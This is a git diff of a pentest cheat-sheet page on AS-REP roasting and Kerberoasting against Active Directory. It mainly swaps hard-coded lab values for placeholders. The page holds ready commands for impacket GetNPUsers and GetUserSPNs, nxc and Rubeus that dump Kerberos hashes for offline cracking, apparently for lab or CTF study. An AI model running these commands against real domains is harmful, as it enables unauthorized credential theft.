@@ -4,7 +4,6 @@ date: 2024-7-6
 tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
 ---
 
----
 ### AS_REP Roasting
 
 {{< tab set1 tab1 active >}}Impacket{{< /tab >}}
@@ -13,14 +12,14 @@ tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controll
 
 <div>
 
-```bash
+```console
 # Multiple valid usernames
-impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -no-pass -dc-ip <DC>
+impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC>
 ```
 
-```bash
+```console
 # Single user without creds
-impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER>
+impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER>
 ```
 
 </div>
@@ -30,9 +29,9 @@ impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER>
 
 <div>
 
-```bash
+```console
 # Multiple valid usernames (nxc)
-nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt
+nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
 ```
 
 </div>
@@ -51,7 +50,7 @@ nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt
 
 <div>
 
-```bash
+```console
 # Fix time skew
 sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
@@ -62,9 +61,9 @@ sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD
 
 <div>
 
-```bash
+```console
 # Kerberoasting without cred
-sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile usernames.txt -dc-host <DC_IP> <DOMAIN>/
+sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/
 ```
 
 </div>
@@ -74,8 +73,8 @@ sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE
 
 <div>
 
-```bash
-nxc ldap <DC_IP> -u <UESR> -p <PASSWORD> --kerberoasting kerberoast_hashes.txt
+```console
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.txt
 ```
 
 </div>
@@ -89,8 +88,8 @@ nxc ldap <DC_IP> -u <UESR> -p <PASSWORD> --kerberoasting kerberoast_hashes.txt
 
 <div>
 
-```cmd
-.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD>
+```console
+.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
 ```
 
 </div>
